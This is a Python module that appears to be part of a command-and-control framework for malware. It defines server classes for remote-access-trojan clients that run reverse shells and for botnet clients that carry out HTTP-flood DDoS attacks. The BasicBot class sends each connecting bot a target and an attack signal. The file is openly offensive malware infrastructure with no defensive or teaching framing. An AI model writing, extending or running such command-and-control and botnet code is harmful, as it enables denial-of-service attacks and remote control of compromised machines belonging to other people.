from .templates import BasicTemplate
from .tools.controlers import BasicBotControler

from multiprocessing import Pipe
from time import sleep


class Basic(BasicTemplate):
    SERV_TYPE = "Basic"
    SERV_INFO = "Basic Server for test"
    WORM_INFO = "Nothing. Only for dev test"
    def __init__(self, ctrl_pipe: Pipe, conf : dict = {}):
        super().__init__(ctrl_pipe=ctrl_pipe, conf=conf)


class Echo(BasicTemplate):
    SERV_TYPE = "Echo"
    SERV_INFO = "Echo Server for test. Recive message and send response"
    WORM_INFO = "Connect to server, send 'Hello World' and recive response"
    def __init__(self, ctrl_pipe: Pipe, conf : dict = {}):
        super().__init__(ctrl_pipe=ctrl_pipe, conf=conf)

class BasicRat(BasicTemplate):
    SERV_TYPE = "BasicRat"
    SERV_INFO = "Server for handling basic rat clients. Handle multpile RAT connection. Send commands and recive response."
    WORM_INFO = "Start the Reverse Shell console, keep connections, catch response and send to server. Include 'pwd' and 'cd' command."
    def __init__(self, ctrl_pipe: Pipe, conf: dict = {}):
        super().__init__(ctrl_pipe=ctrl_pipe, conf=conf)


class BasicBot(BasicTemplate):
    SERV_TYPE = "BasicBot"
    SERV_INFO = "Server for handling basic botnet clients. Handle multiple BOT connection. Send commands"
    WORM_INFO = "Botnet Client can perform DDOS Attack (Http_Flood). Client can receive commands or act automatically"
    def __init__(self, ctrl_pipe: Pipe, conf: dict = {}, controlers=BasicBotControler):
        super().__init__(ctrl_pipe=ctrl_pipe, conf=conf, controlers=controlers)
        self.targetAttack = None
        self.signalAttack = None
    
    def acceptConn(self, client: object) -> None:
        if self.targetAttack:
            client.sendMsg(f"tar {self.targetAttack}")
        sleep(0.5)
        if self.signalAttack:
            client.sendMsg("ATT")
    
